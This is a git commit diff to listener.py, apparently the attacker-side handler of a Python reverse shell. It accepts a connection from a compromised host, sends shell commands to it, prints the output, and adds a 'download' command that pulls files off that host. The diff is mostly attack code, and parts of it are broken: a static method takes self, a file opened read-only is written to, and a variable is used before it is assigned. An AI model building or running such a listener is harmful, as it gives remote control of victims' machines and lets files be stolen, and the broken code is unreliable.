6350e00b80c0876ae3355ae60c5af1e3c937b316
Deus <119631661+OldKokoroz@users.noreply.github.com>
2024-01-19 23:58:31 +0300

    Update listener.py

--- listener.py
+++ listener.py
@@ -1,6 +1,7 @@
 import socket
 import optparse
 import json
+import base64
 
 
 def get_inputs():
@@ -16,14 +17,14 @@ class MainMate:
     (user_input, arguments) = get_inputs()
 
     def __init__(self, ip=user_input.ip, port=user_input.port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip, port))
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((ip, port))
 
-        listener.listen(0)  # 0 for no connection limit
+        self.listener.listen(0)  # 0 for no connection limit
         print("Listening..")
 
-        (self.connection, self.ipg) = listener.accept()
+        (self.connection, self.ipg) = self.listener.accept()
         print(f"Connected to {self.ipg} on {port} \n\nListening..\n")
 
     def send_j(self, pack):
@@ -40,13 +41,29 @@ class MainMate:
             except ValueError:
                 continue
 
+    @staticmethod
+    def saving(self, file, inc):
+        with open(file, "rb") as writing:
+            writing.write(base64.b64decode(inc))
+            return f"{file} is downloaded"
+
     def cmd_loop(self):
         while True:
-            cmd_inp = input(f"{self.ipg}:").encode()
+            cmd_inp = input(f"{self.ipg}$ ").split(" ")
             self.send_j(cmd_inp)
 
-            cmd_out = self.recv_j()
-            print(cmd_out)
+            if cmd_inp[0] == "exit":
+                self.listener.close()
+                break
+
+            elif cmd_inp[0] == "download":
+                cmd_out = self.saving(cmd_inp[1], cmd_out)
+
+            else:
+                cmd_out = self.recv_j()
+                print(cmd_out)
+
+        self.listener.close()
 
 
 start = MainMate()  # Ip and port are set to CLI-inputs by default
